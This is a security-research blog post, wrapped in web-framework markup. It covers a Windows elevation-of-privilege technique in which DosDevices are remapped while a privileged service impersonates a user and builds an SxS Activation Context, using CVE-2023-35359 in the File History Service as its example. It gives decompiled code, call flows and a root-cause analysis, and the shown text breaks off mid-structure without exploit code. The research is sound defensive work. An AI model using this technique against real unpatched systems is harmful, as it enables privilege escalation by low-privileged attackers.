1:"$Sreact.fragment"
2:"$Sreact.suspense"
3:I[75989,["6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","2467","static/chunks/2467-7c736c42c91fb3af.js","214","static/chunks/214-845c2722ecb73b86.js","7177","static/chunks/app/layout-f709b6a7dd5adbfc.js"],"GoogleAnalytics"]
4:I[29093,["6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","2467","static/chunks/2467-7c736c42c91fb3af.js","214","static/chunks/214-845c2722ecb73b86.js","7177","static/chunks/app/layout-f709b6a7dd5adbfc.js"],"PageLoadWrapper"]
5:I[2148,["6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","2467","static/chunks/2467-7c736c42c91fb3af.js","214","static/chunks/214-845c2722ecb73b86.js","7177","static/chunks/app/layout-f709b6a7dd5adbfc.js"],"Header"]
6:I[87555,[],""]
7:I[31295,[],""]
8:I[32876,["6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","4345","static/chunks/app/not-found-cbc74e2537bbd3aa.js"],"default"]
9:I[6874,["6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","2467","static/chunks/2467-7c736c42c91fb3af.js","214","static/chunks/214-845c2722ecb73b86.js","7177","static/chunks/app/layout-f709b6a7dd5adbfc.js"],""]
c:I[59665,[],"MetadataBoundary"]
e:I[59665,[],"OutletBoundary"]
11:I[74911,[],"AsyncMetadataOutlet"]
13:I[59665,[],"ViewportBoundary"]
15:I[26614,[],""]
:HL["/_next/static/media/569ce4b8f30dc480-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
:HL["/_next/static/media/93f479601ee12b01-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
:HL["/_next/static/media/d8804d28b3f5ce05-s.p.otf","font",{"crossOrigin":"","type":"font/otf"}]
:HL["/_next/static/css/4dfd5a5264424a0f.css","style"]
:HL["/_next/static/css/2a75dc013f3ed419.css","style"]
:HL["/_next/static/css/09dfadb69bdaa005.css","style"]
:HL["/_next/static/css/06fcfbe31f4b8e82.css","style"]
a:T4ef,M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z0:{"P":null,"b":"gMyW5qIY4BG4upgCzpuGJ","p":"","c":["","blogs","activation-context-hell-dosdevices-remapping-attack-under-impersonation"],"i":false,"f":[[["",{"children":["blogs",{"children":[["slug","activation-context-hell-dosdevices-remapping-attack-under-impersonation","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/4dfd5a5264424a0f.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/2a75dc013f3ed419.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":[["$","head",null,{"children":["$","$2",null,{"fallback":null,"children":["$","$L3",null,{}]}]}],["$","body",null,{"className":"__variable_5cfdac __variable_9a8899 __variable_45311c antialiased min-h-screen flex flex-col","children":["$","$2",null,{"fallback":null,"children":["$","$L4",null,{"children":[["$","$L5",null,{}],["$","main",null,{"className":"flex-grow container mx-auto pt-24 pb-20","children":["$","$L6",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L7",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","$L8",null,{}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}],["$","footer",null,{"className":"fixed left-0 bottom-0 right-0 border-t border-primary/30 bg-background/95 backdrop-blur-sm py-2 px-2 sm:px-4 w-full z-10 print:relative","children":["$","div",null,{"className":"container mx-auto px-0","children":["$","div",null,{"className":"flex items-center justify-between w-full","children":[["$","div",null,{"className":"flex-1","children":["$","div",null,{"className":"text-xs sm:text-sm font-semibold bg-gradient-to-r from-primary/90 to-secondary/90 bg-clip-text text-transparent truncate","children":["© ",2025," ","HackSys Inc"]}]}],["$","div",null,{"className":"flex items-center gap-3 sm:gap-4 ml-4","children":[["$","$L9",null,{"href":"https://twitter.com/HackSysTeam","className":"text-muted-foreground hover:text-primary transition-all duration-200","aria-label":"Twitter","children":["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","width":"16","height":"16","className":"sm:w-[18px] sm:h-[18px]","viewBox":"0 0 24 24","fill":"currentColor","role":"img","aria-hidden":"true","children":[["$","title",null,{"children":"X"}],["$","path",null,{"d":"M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"}]]}]}],["$","$L9",null,{"href":"https://github.com/hacksysteam","className":"text-muted-foreground hover:text-primary transition-all duration-200","aria-label":"GitHub","children":["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","width":"16","height":"16","className":"sm:w-[18px] sm:h-[18px]","viewBox":"0 0 24 24","fill":"currentColor","role":"img","aria-hidden":"true","children":[["$","title",null,{"children":"GitHub"}],["$","path",null,{"d":"M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"}]]}]}],["$","$L9",null,{"href":"https://www.facebook.com/HackSysTeam","className":"text-muted-foreground hover:text-primary transition-all duration-200","aria-label":"Facebook","children":["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","width":"16","height":"16","className":"sm:w-[18px] sm:h-[18px]","viewBox":"0 0 24 24","fill":"currentColor","role":"img","aria-hidden":"true","children":[["$","title",null,{"children":"Facebook"}],["$","path",null,{"d":"M9.101 23.691v-7.98H6.627v-3.667h2.474v-1.58c0-4.085 1.848-5.978 5.858-5.978.401 0 .955.042 1.468.103a8.68 8.68 0 0 1 1.141.195v3.325a8.623 8.623 0 0 0-.653-.036 26.805 26.805 0 0 0-.733-.009c-.707 0-1.259.096-1.675.309a1.686 1.686 0 0 0-.679.622c-.258.42-.374.995-.374 1.752v1.297h3.919l-.386 2.103-.287 1.564h-3.246v8.245C19.396 23.238 24 18.179 24 12.044c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.628 3.874 10.35 9.101 11.647Z"}]]}]}],["$","$L9",null,{"href":"https://discord.com/invite/ns32uNhaq7","className":"text-muted-foreground hover:text-primary transition-all duration-200","aria-label":"Discord","children":["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","width":"16","height":"16","className":"sm:w-[18px] sm:h-[18px]","viewBox":"0 0 24 24","fill":"currentColor","role":"img","aria-hidden":"true","children":[["$","title",null,{"children":"Discord"}],["$","path",null,{"d":"$a"}]]}]}]]}]]}]}]}]]}]}]}]]}]]}],{"children":["blogs",["$","$1","c",{"children":[null,["$","$L6",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L7",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["slug","activation-context-hell-dosdevices-remapping-attack-under-impersonation","d"],["$","$1","c",{"children":[null,["$","$L6",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L7",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$Lb",["$","$Lc",null,{"children":"$Ld"}],[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/09dfadb69bdaa005.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/06fcfbe31f4b8e82.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","$Le",null,{"children":["$Lf","$L10",["$","$L11",null,{"promise":"$@12"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,["$","$1","HohPeFfJ34rHXCb3ZKujC",{"children":[["$","$L13",null,{"children":"$L14"}],["$","meta",null,{"name":"next-size-adjust","content":""}]]}],null]}],false]],"m":"$undefined","G":["$15","$undefined"],"s":false,"S":true}
16:I[74911,[],"AsyncMetadata"]
18:I[88793,["7330","static/chunks/d3ac728e-41fcba63e1ac6655.js","5661","static/chunks/e0368f7a-1235c34447e61195.js","6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","1456","static/chunks/1456-5cbd6dd70e2edd95.js","6877","static/chunks/6877-676b4dd2ee485b26.js","7882","static/chunks/7882-5f5fc3a912ab1310.js","3744","static/chunks/app/blogs/%5Bslug%5D/page-0492cfdbe1b5efd7.js"],"HeroSection"]
19:I[750,["7330","static/chunks/d3ac728e-41fcba63e1ac6655.js","5661","static/chunks/e0368f7a-1235c34447e61195.js","6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","1456","static/chunks/1456-5cbd6dd70e2edd95.js","6877","static/chunks/6877-676b4dd2ee485b26.js","7882","static/chunks/7882-5f5fc3a912ab1310.js","3744","static/chunks/app/blogs/%5Bslug%5D/page-0492cfdbe1b5efd7.js"],"default"]
d:["$","$2",null,{"fallback":null,"children":["$","$L16",null,{"promise":"$@17"}]}]
1a:Ta27c,
## Overview

After listening to a captivating talk by [Maddie Stone](https://twitter.com/maddiestone) and [James Forshaw](https://twitter.com/tiraniddo) [The Print Spooler Bug that Wasn't in the Print Spooler](https://www.youtube.com/watch?v=H03b0UaogVs) and delving into the [SSD Advisory – File History Service (fhsvc.dll) Elevation of Privilege](https://ssd-disclosure.com/ssd-advisory-file-history-service-fhsvc-dll-elevation-of-privilege/), our interest was piqued regarding a specific attack surface within the **Windows** architecture. This led us to explore the intricate relationship between the [Side-by-Side (SxS) Assemblies](https://learn.microsoft.com/en-us/windows/win32/sbscs/about-side-by-side-assemblies-) [Activation Context](https://learn.microsoft.com/en-us/windows/win32/sbscs/activation-contexts) and the [DosDevices](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-ms-dos-device-names) symbolic link mechanism.

Over the years, several **CVEs** have been associated with the **Activation Context**. Some of them are listed below:

* [CVE-2015-1644](https://bugs.chromium.org/p/project-zero/issues/detail?id=240)
* [CVE-2022-22047](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-22047)
* [CVE-2022-37987](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2022-37987)
* [CVE-2022-37989](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2022-37989)
* [CVE-2023-35359](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2022-37989)

> **Disclaimer:** The CVEs mentioned in this list are by no means exhaustive.

**Zero Day Initiative (ZDI)** also found couple of bugs related to the **Activation Context**. They also blogged about it, you can read this article here: <https://www.zerodayinitiative.com/blog/2023/1/23/activation-context-cache-poisoning-exploiting-csrss-for-privilege-escalation>

**CVE-2023-35359** is very interesting as this single CVE is assigned to at least **three** different bugs. These bugs were reported by [James Forshaw](https://bugs.chromium.org/p/project-zero/issues/detail?id=2451), [SSD Disclosure](https://ssd-disclosure.com/ssd-advisory-file-history-service-fhsvc-dll-elevation-of-privilege/) and [y3a](https://y3a.github.io/2023/08/24/cve-2023-35359/).

For this blog post, we will be using [SSD Disclosure's bug](https://ssd-disclosure.com/ssd-advisory-file-history-service-fhsvc-dll-elevation-of-privilege/) as our primary example due to its ease of triggering and its relevance to our discussion.

In the intricate landscape of Windows architecture, the interplay between the **Side-by-Side (SxS)** assembly's **Activation Context** and the `DosDevices` symbolic link mechanism presents a unique security challenge. When a **high privileged** service is **impersonating** a **low privileged** user, a window of opportunity opens for potential exploitation through `DosDevices` remapping.

An attacker can alter the mapping of familiar **DOS** device names, leading to **unintended and potentially malicious** file operations. Such an attack can result in an **elevation of privilege**, allowing a **low privileged** user to execute actions typically reserved for higher privileges.

> **Disclaimer:** The insights shared in this blog post reflect our **comprehension** and **interpretation** of the subject.

This post aims to shed light on the nuances of this attack vector, exploring the intricacies of the **Activation Context** within the **SxS Assembly** and the potential risks associated with `DosDevices` remapping under **impersonation**.

> **Note:** For a more in-depth understanding, subsequent sections will delve into the specifics of the **DosDevices** mechanism, **SxS Assemblies**, and **Activation Context**.

## DosDevices

In the **Windows** operating system, `DosDevices` is a special directory that plays a crucial role in the mapping of **DOS drive** letters to **NT paths**. It serves as a symbolic link, providing a bridge between the user-friendly **DOS-style path names** and the underlying **Windows NT path names**.

The primary purpose of `DosDevices` is to ensure compatibility. While modern applications typically use **Windows NT paths**, many legacy applications (and even some modern ones) still rely on **DOS-style paths**. By providing a mapping mechanism, `DosDevices` ensures that these applications can function correctly on the **Windows NT** platform.

Here is a typical example:

* Drive Letters:
  * **DOS Path**: `C:\Windows\System32`
  * **NT Path**: `\Device\HarddiskVolumeX\Windows\System32`

> **Info:** For a deeper dive into the intricacies of **Windows** paths and the role of **DosDevices**, consider reading [Windows Drivers are True'ly Tricky](https://googleprojectzero.blogspot.com/2015/10/windows-drivers-are-truely-tricky.html) by **James Forshaw** which sheds light on the complexities of **Windows** paths.

## LoadLibrary

The `LoadLibrary` function is a part of the **Windows** API and is used to **load** a **Dynamic-Link Library** (**DLL**) into the memory of the calling process.

When the `LoadLibrary` function is called to load a **DLL** that includes a **Side-by-Side** (**SxS**) manifest, the process is slightly more complex and involves the creation of an **Activation Context**.

## Impersonation

**Impersonation** is a powerful feature in **Windows** that allows a process to temporarily **assume** the **security context** of **another user**. This is a vital capability, particularly in situations where a process needs to perform actions or access resources on behalf of a user.

Several APIs are related to **impersonation** in **Windows**:

* [ImpersonateLoggedOnUser](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser)
* [RpcImpersonateClient](https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcimpersonateclient)
* [ImpersonateSelf](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateself)
* [RevertToSelf](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself)

## Client/Server Runtime Subsystem (CSRSS)

The **Client/Server Runtime Subsystem** (**CSRSS**) is a critical component of the **Windows** operating system. It is responsible for a variety of important functions, including the management of the Windows console, the creation and deletion of threads, and the implementation of the 16-bit virtual **MS-DOS** environment.

One of the key responsibilities of **CSRSS** is the management of **activation contexts** and **Side-by-Side (SxS) assemblies**.

### Side-by-Side Assemblies

Windows **Side-by-Side** (**SxS**) assemblies allow **multiple versions** of a **COM** or **Windows API** component to coexist. This technology reduces **DLL Hell**, a problem that occurs when two applications need to use a **DLL** of the same name but a different version. **SxS Assemblies** are described by **manifest** files, which contain information used for **binding** and **activation**.

### Manifests

**Manifests** are **XML** files that describes the assemblies or **isolated** applications. They contain information used for **binding** and **activation**, such as **COM classes**, **interfaces**, and **type libraries**, that have traditionally been stored in the registry.

A typical **manifest** file is given below:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!-- Copyright (c) Microsoft Corporation -->
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
<assemblyIdentity
    name="Microsoft.Windows.Shell.calc"
    processorArchitecture="amd64"
    version="5.1.0.0"
    type="win32"/>
<description>Windows Shell</description>
<dependency>
    <dependentAssembly>
        <assemblyIdentity
            type="win32"
            name="Microsoft.Windows.Common-Controls"
            version="6.0.0.0"
            processorArchitecture="*"
            publicKeyToken="6595b64144ccf1df"
            language="*"
        />
    </dependentAssembly>
</dependency>
<trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
        <requestedPrivileges>
            <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
        </requestedPrivileges>
    </security>
</trustInfo>
<application xmlns="urn:schemas-microsoft-com:asm.v3">
    <windowsSettings>
        <dpiAware  xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</dpiAware>
    </windowsSettings>
</application>
</assembly>
```

> **Info:** For a comprehensive understanding of **manifest** XML and its various elements, consider reading: <https://learn.microsoft.com/en-us/windows/win32/sbscs/application-manifests>

### Activation Context

An **Activation Context** is a data structure in memory that contains information that the system can use to **redirect** an application to **load** a specific **DLL version**, **COM object** instance, or **custom window version**. It is used with **Side-by-Side (SxS) assemblies** to manage the **names**, **versions**, **resources**, and **dependent assemblies**.

### Activation Context Cache

The **Activation Context Cache** is an **AVL tree** cache that stores the **activation contexts** for reuse. `BaseSrvActivationContextCacheCompareEntries` is used to identify a hit or miss in the cache. This cache is used to improve performance by avoiding the need to re-parse the **manifest** XML. The cache is managed by the `csrss.exe` process and can be queried during **process startup** or **library loading** by calling into `csrss.exe` via `CsrClientCallServer` resulting in calls to `BaseSrvSxsCreateProcess` or `BaseSrvSxsCreateActivationContext` inside `sxssrv.dll`. The comparison function checks the **Win32 path** of the file, **assembly directory**, **language string**, **last write timestamp** of the executable, **token integrity level** value, and some **flags**.

## File History Service - CVE-2023-35359

**File History** is a backup application that continuously protects your files stored in **Libraries**, **Desktop**, **Favorites**, and **Contacts** folders. It periodically (by default every hour) scans the file system for changes and copies changed files to another location. Every time any of your files has changed, its copy will be stored on a dedicated, external storage device selected by you. Over time, **File History** builds a complete history of changes made to any personal file.

**File History Service** is implemented inside `C:\Windows\System32\fhsvc.dll`. Let's see what the vulnerable function looks like:

```cpp
void __fastcall CManagerThread::QueueBackupForLoggedOnUser(CManagerThread *this, ULONG a2)
{
  ...
  result = CoInitializeEx(0i64, 0);
  ...
  if ( !WTSQueryUserToken(a2, &phToken) ) // --> [1]
  {
    ...
  }
  if ( ImpersonateLoggedOnUser(phToken) ) // --> [2]
  {
    CurrentThread = GetCurrentThread();
    if ( OpenThreadToken(CurrentThread, 0xCu, 1, &TokenHandle) )
    {
      result = CoCreateInstance(&CLSID_FhConfigMgr, 0i64, 0x17u, &GUID_e388cb3e_d90b_4e2a_a025_42c7f1e655a4, &ppv); // --> [3]
      ...
    }
    else
    {
      ...
    }
  ...
  }
  ...
}
```

### Bug Pattern

When analyzing the function `CManagerThread::QueueBackupForLoggedOnUser`, a specific pattern of vulnerability emerges that can be exploited by attackers. Let's break down the sequence of operations and understand the underlying issue:

* **Impersonation**
  * The function begins by calling `WTSQueryUserToken` to retrieve the **token** associated with a **logged-on** user session. This **token** is then used by `ImpersonateLoggedOnUser` to **impersonate** the user associated with that **token**. This means that any subsequent operations will be performed with the privileges of the **impersonated** user.

* **Loading DLL**
  * After successful **impersonation**, the function proceeds to call `CoCreateInstance`. This API is used to create an instance of a specific **COM** object identified by the `CLSID` (class ID). In this specific case, it attempts to load a **COM** **DLL**, for instance, `C:\Windows\System32\fhcfg.dll`.

> **Note:** `fhcfg.dll` has a **SxS** **manifest** file embedded inside it.

### The Vulnerability

The crux of the vulnerability lies in the combination of the above steps. When `CoCreateInstance` is called **post-impersonation**, it uses the `LoadLibraryExW` function internally to load the required **DLL**. However, due to the **impersonated** context, there's a potential for an **attacker** to **redirect** or **influence** the **loading** of this **DLL**, leading to a classic **DLL hijacking** scenario.

Below given is the call flow, which shows how `LoadLibraryExW` is being invoked internally by `CoCreateInstance`:

```mermaid
graph TD
    A[CFhService::StartServiceW]
    B[CManagerThread::QueueBackupForLoggedOnUser]
    C[CoCreateInstance]
    D[CComActivator::DoCreateInstance]
    E[ICoCreateInstanceEx]
    F[ActivationPropertiesIn::DelegateCreateInstance]
    G[CClientContextActivator::CreateInstance]
    H[ActivationPropertiesIn::DelegateCreateInstance]
    I[CProcessActivator::CreateInstance]
    J[CProcessActivator::ActivateByContext]
    K[CProcessActivator::AttemptActivation]
    L[CProcessActivator::CCICallback]
    M[CApartmentActivator::CreateInstance]
    N[ActivationPropertiesIn::DelegateCreateInstance]
    O[CServerContextActivator::CreateInstance]
    P[CClassCache::GetClassObject]
    Q[CClassCache::GetClassObjectActivator]
    R[CClassCache::CClassEntry::CreateDllClassEntry]
    S[CClassCache::CDllPathEntry::Create]
    T[CClassCache::CDllPathEntry::LoadDll]
    U[LoadLibraryWithLogging]
    V[LoadLibraryExW]

    A --> B
    B --> C
    C --> D
    D --> E
    E --> F
    F --> G
    G --> H
    H --> I
    I --> J
    J --> K
    K --> L
    L --> M
    M --> N
    N --> O
    O --> P
    P --> Q
    Q --> R
    R --> S
    S --> T
    T --> U
    U --> V
```

> **Note:** The vulnerability only occurs when the **DLL** being loaded under **impersonation** has a **Side-by-Side (SxS) manifest** file embedded inside it.

Below is the call flow of `LoadLibraryExW` when the **DLL** has **SxS manifest**:

```mermaid
graph TD
    A[LoadLibraryExW]
    B[LdrLoadDll]
    C[LdrpLoadDllInternal]
    D[LdrpProcessWork]
    E[LdrpMapDllFullPath]
    F[LdrpMapDllNtFileName]
    G[LdrpMapDllWithSectionHandle]
    H[LdrpMapAndSnapDependency]
    I[LdrpFindDllActivationContext]
    J[BasepProbeForDllManifest]
    K[CreateActCtxW]
    L[CreateActCtxWWorker]
    M[BasepCreateActCtx]

    A --> B
    B --> C
    C --> D
    D --> E
    E --> F
    F --> G
    G --> H
    H --> I
    I --> J
    J --> K
    K --> L
    L --> M
```

## Root Cause Analysis

When a process starts in **Windows**, it registers with the **Client/Server Runtime Subsystem (CSRSS)** of the respective **session**, establishes an **Activation Context** for **Side-by-Side Assembly**, etc. The process of creating an **Activation Context** involves calling `BasepCreateActCtx` from `kernel32.dll`.

The call flow which handles the **Activation Context** messages in `csrss.exe`, looks like this:

```mermaid
graph TD
    A[CsrApiRequestThread]
    B[BaseSrvSxsCreateActivationContext]
    C[BaseSrvSxsCreateActivationContextFromMessage]
    D[BaseSrvSxsCreateActivationContextFromStructEx]
    E[CsrImpersonateClient]
    F[SxsGenerateActivationContext]
    G[CsrRevertToSelf]

    A -->|1| B
    B -->|2| C
    C -->|3| D
    D -->|4| E
    D -->|5| F
    D -->|6| G
```

The message being sent to `csrss.exe` is described as given below:

```cpp
typedef struct _BASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG
{
    ULONG Flags;
    USHORT ProcessorArchitecture;
    UNICODE_STRING CultureFallbacks;
    struct _BASE_MSG_SXS_STREAM Manifest;
    struct _BASE_MSG_SXS_STREAM Policy;
    UNICODE_STRING AssemblyDirectory;
    UNICODE_STRING TextualAssemblyIdentity;
    unsigned __int64 FileTime;
    ULONG ResourceName;
    PVOID ActivationContextData;
    struct _ACTIVATION_CONTEXT_RUN_LEVEL_INFORMATION RunLevel;
    UNICODE_STRING AssemblyName;
} BASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG, *PBASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG;

typedef struct _BASE_MSG_SXS_STREAM
{
    UCHAR FileType;
    UCHAR PathType;
    UCHAR HandleType;
    UNICODE_STRING Path;
    PVOID FileHandle;
    HANDLE Handle;
    unsigned __int64 Offset;
    ULONG Size;
} BASE_MSG_SXS_STREAM, *PBASE_MSG_SXS_STREAM;
```

> **Warning:** The above structure may be inaccurate and is from an older version of **Windows**. Source: <https://github.com/Fyyre/ntdll/blob/master/ntdll.h>

Some important members are:

* `CultureFallbacks` - language and regional settings, like `en-US`.
* `Manifest.Path` - the path of the manifest file, usually it's the binary path `C:\Windows\System32\fhcfg.dll`.
* `AssemblyDirectory` - the path of the directory where to look for assemblies, this is usually `C:\Windows\System32\`.

`BaseSrvSxsCreateActivationContext` in `csrss.exe` is responsible for the validation and processing of the messages that are being received.

Let's look at these functions and understand what they do:

```cpp
ULONG
BaseSrvSxsCreateActivationContext(
    IN OUT PCSR_API_MSG m,
    IN OUT PCSR_REPLY_STATUS ReplyStatus
    )
{
    return BaseSrvSxsCreateActivationContextFromMessage(m, ReplyStatus);
}

ULONG
BaseSrvSxsCreateActivationContextFromMessage(
    IN OUT PCSR_API_MSG m,
    IN OUT PCSR_REPLY_STATUS ReplyStatus
    )
{
    PBASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG Message =
        (PBASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG) &m->u.ApiMessageData;

    NTSTATUS Status = STATUS_SUCCESS;
    HANDLE CsrClientProcess = NULL;
    PCUNICODE_STRING StringsInMessageToValidate[4];
    ULONG i = 0;

    ...

    StringsInMessageToValidate[0] = &Message->Manifest.Path;
    StringsInMessageToValidate[1] = &Message->Policy.Path;
    StringsInMessageToValidate[2] = &Message->AssemblyDirectory;
    StringsInMessageToValidate[3] = &Message->TextualAssemblyIdentity;
    Status = BaseSrvSxsValidateMessageStrings(m, RTL_NUMBER_OF(StringsInMessageToValidate), StringsInMessageToValidate);
    if (!NT_SUCCESS(Status)) {
        goto Exit;
    }

    ...

    CsrClientProcess = CSR_SERVER_QUERYCLIENTTHREAD()->Process->ProcessHandle;

    Status = BaseSrvSxsCreateActivationContextFromStruct(CsrClientProcess, CsrClientProcess, Message, NULL);
    if (!NT_SUCCESS(Status)) {
        goto Exit;
    }

    Status = STATUS_SUCCESS;
Exit:
    ...
    return Status;
}
```

> **Warning:** These functions are from a pretty old version of **Windows**, but it is enough to understand what's going on. Source: <https://github.com/selfrender/Windows-Server-2003/blob/master/base/win32/server/srvsxs.c>

In the recent versions of **Windows** `BaseSrvSxsCreateActivationContextFromStruct` has been renamed to `BaseSrvSxsCreateActivationContextFromStructEx`.

```cpp
NTSTATUS __fastcall BaseSrvSxsCreateActivationContextFromStructEx(
        HANDLE CsrClientProcess,
        HANDLE SxsClientProcess,
        BASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG *Struct,
        struct_FileInformation *FileInformation,
        HANDLE *OutSection)
{
    ...

    Status = BaseSrvSxsGetActivationContextGenerationFunction(&FunctionPointer, &Cookie);
    ...
    SuccessfulImpersonation = FALSE;
    ...
    SuccessfulImpersonation = CsrImpersonateClient(NULL);
    ...
    if ( !FunctionPointer(&SxsDllParameters) )
    {
        ...
    }
    ...
    if ( SuccessfulImpersonation )
        CsrRevertToSelf();
    ...
    return Status;
}
```

One of the key things to notice in the `BaseSrvSxsCreateActivationContextFromStructEx` function is that it's generating the **Activation Context** while it's **impersonating** the **caller** using `CsrImpersonateClient`. The `FunctionPointer` is the `SxsGenerateActivationContext` function and `SxsDllParameters` is of type `SXS_GENERATE_ACTIVATION_CONTEXT_PARAMETERS`.

```cpp
typedef struct _SXS_GENERATE_ACTIVATION_CONTEXT_PARAMETERS
{
    IN DWORD    Flags;
    IN USHORT   ProcessorArchitecture;
    IN LANGID   LangId;
    IN PCWSTR   AssemblyDirectory;
    IN PCWSTR   TextualAssemblyIdentity;
    IN SXS_GENERATE_ACTIVATION_CONTEXT_STREAM Manifest;
    IN SXS_GENERATE_ACTIVATION_CONTEXT_STREAM Policy;
    OUT DWORD   SystemDefaultActCxtGenerationResult;
